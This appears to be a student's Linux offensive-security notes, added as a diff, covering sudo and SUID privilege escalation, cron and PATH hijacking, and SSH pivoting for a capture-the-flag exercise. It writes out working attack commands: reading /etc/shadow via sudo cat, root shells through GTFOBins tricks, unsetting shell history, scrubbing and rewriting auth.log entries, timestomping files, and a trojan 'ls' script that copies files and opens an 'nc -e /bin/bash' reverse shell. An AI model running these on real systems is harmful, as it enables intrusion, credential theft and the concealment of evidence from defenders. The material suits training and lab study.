@@ -1,1 +1,174 @@
+Privilege Escalation: The act of getting the privileges of another account other than yourself, it does not need to have higher privileges.
+sudo -l  <------ shows your permissions on which ever account you're on
+
+Sudo_Demo--------------
+ssh dem1@10.50.32.XXX
+sudo -l    
+Go to google and search gtfobins.github
+sudo apt-get changelog apt
+#!/bin/sh
+(It should now show up with a #)
+# whoami
+! to return
+ssh demo2@xxx.xxx.xxx.xxx
+sudo -l  (as root, with no password you can run /bin/cat and /var/log/syslog*)
+ls /var/log/syslog  (Access to anything beyond this point)
+sudo cat /var/log/syslog /etc/shadow  (You can abuse this because you're viewing it with /var/log/syslog, so you can view pretty much any other directory so long as it's paired with the viewable directory) 
+sudo -l gets its information from /etc/sudoers
+cat /etc/sudoers
+(Syntax is very important when messing with the sudoers file, since if any line is off then none of it will work)
+EX: root    ALL=(ALL:ALL) ALL
+    %admin  ALL=(ALL:ALL) ALL
+    %sudo  ALL=(ALL:ALL) ALL
+      ^------------The percent sign stands for a group
+Use the examples in the sudoers file for if you're trying to make a new rule
+SUID/SGID
+SUID bit and the sticky bit are 2 seperate things
+4-other 2-group owner 1-user owner this is for SUID
+ls -la $(which passwd)
+RUID: This is your actual or real user ID and EUID: Roots ID after sudoing
+find / -type f -perm /4000 -ls 2>/dev/null           (Command to find files that have SUID turned on) 
+                                    ^---Prevents messages like permission denied, can use with other commands
+                                         Powershell also uses this, just a little different syntax
+find / -type f -perm /2000 -ls 2>/dev/null         (2000 is for SGID bit)
+find / -type f -perm /6000 -ls 2>/dev/null         (This will spit out everything)
+(Useful one is /usr/bin/nice, search it up on https://gtfobins.github.io/gtfobins)
+Make sure to read the details so then you don't do things such as install the SUID and you dont't have to do ./ in front of nice when you run the command
+nice /bin/sh -p
+# whoami
+
+CRON jobs can be used to do privilege escalation
+cat /etc/crontab (To view cron jobs for the system and users)
+crontab -l  (List cronjobs for current user)
+crontab -e  (Allows you to edit cronjobs)
+crontab -r  (Removes a cronjob)
+crontab -r -u (-u to view cronjobs for other users that you're allowed to see)
+https://crontab.guru  (Website for helping with cronjob timing)
+ls -la /etc/cron  (Do this for daily, hourly, monthly, to see different cronjobs)
+find / -type d -perm /2 -ls 2>/dev/null              (This is for searching for world-writable files and folders)
+ 
+ _ _ _ _ 2000 0002 (Value depends on which permissions you're looking for, 0002 is for other/world-writable)
+ s u g o
+ls -laitr   (-l: long listing -a: all files -i: inodes -t: sort by time -r: reverse sort)
+PATH=".:$PATH"  (Adds a dot . to the PATH avriable)
+vim cat
+  #!/usr/bin/env bash
+  echo "Meow.."
+ 
+This can mess it up whenever you are trying to do actual cat because the dot . will prioritized the other cat.
+In other words, do not have a dot . in your path variable. 
+
+
+Tradecraft:
+unset HISTFILE
+ps -p 1 (view init type, either SYSTEMD or SYSTEMV)
+
+Way To Figure Out Init Type:
+ps -p 1
+
+
+
+Logs for Covering Tracks
+Logs typically housed in /var/log & useful logs:
+
+
+auth.log/secure- Logins/authentications
+
+lastlog- Each users' last successful login time
+
+btmp- Bad login attempts
+
+sulog- Usage of SU command
+
+utmp- Currently logged in users (W command)
+
+wtmp- Permanent record on user on/off
+
+INODE - Index number for the file system
+(You can affect inodes using mv, cp, and cat)
+(Don't clean a live log file and make a copy of the log before cleaning)
+
+Precise Log cleaning:
+(Always work on a backup!)
+GREP (Remove)
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+
+SED (Replace)
+cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+
+Timestomp: 
+touch -c -t 20181012 vulnserver.exe                        (Changes time last accessed and modified)
+touch -r msfinstall vulnserver.exe              (This makes it so the matches the time to another file which is important since we need the nano seconds to actually chnage instead of all zeros which is suspicous)
+
+For Viewinf Rsyslog
+/etc/rsyslog.d/*        (For Newer versions)
+/etc/rsyslog.conf       (For Older versions)
+Find out- grep "IncludeConfig" /etc/rsyslog.conf
+
+Rsyslog Examples
+
+kern.*                                                # All kernel messages, all severities
+mail.crit
+cron.!info,!debug
+*.*  @192.168.10.254:514       (Single @ is udp and double @@ is tcp)        # Old format
+*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
+#mail.*
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+CTFs
+Scheme of Maneuver:
+>Jump Box
+->Pivot:192.168.28.105
+--->T1: 192.168.28.27
+--->T2: 192.168.28.12
+
+OP Notes:----------------
+
+  ssh -MS /tmp/jump student@10.50.29.89  (connection to jump box)
+  ssh -S /tmp/jump jim -O forward -D 9050
+  ssh -S /tmp/jump jim -O forward -L 7020:192.168.28.105:2222
+  
+  ssh -MS /tmp/tum comrade@127.0.0.1 -p 7020
+  ssh -S /tmp/jump jim -O cancel -D 9050
+  ssh -S /tmp/tum tum -O forward -D 9050
+  proxychains nmap 192.168.28.27 -T4 -Pn -p 1-9999
+  proxychains nmap 192.168.28.12 -T4 -Pn -p 1-9999
+  ssh -S /tmp/tum tum -O forward -L 7021:192.168.28.27:22
+  
+  ssh -MS /tmp/dum comrade@127.0.0.1 -p 7021
+  ssh -S /tmp/tum tum -O cancel -D 9050
+  ssh -S /tmp/dum dum -O forward -D 9050
+  unset HISTFILE
+  
+  Enumerate 1
+  cd /tmp
+  vi ls
+    #!/bin/sh
+    
+    whoami >> /tmp/stuff.txt;
+    
+    /bin/ls -lisa /home/billybob >> /tmp/stuff2.txt
+    
+    cat /home/billybob/f!@g1.txt >> /tmp/stuff2.txt
+
+  chmod 755 ls
+  cd /var/tmp 
+  vi ls
+    #!/bin/bash
+    
+    whoami >> /tmp/stuff.txt;
+    
+    /bin/ls -lisa /home/billybob >> /tmp/stuff2.txt
+    
+    cat /home/billybob/f!@g1.txt >> /tmp/stuff2.txt
+    
+    cat /home/billybob10-million-password-list-top-10000.txt >> /tmp/stuff3.txt
+    
+    nc -e /bin/bash 192.168.2 9999
+
+  chmod 755 ls
+
+  watch -n1 "ls -l"     (Use this command to watch live changes in file size) 
+  
+  On Lin OPS: nc -lvp 9999
 
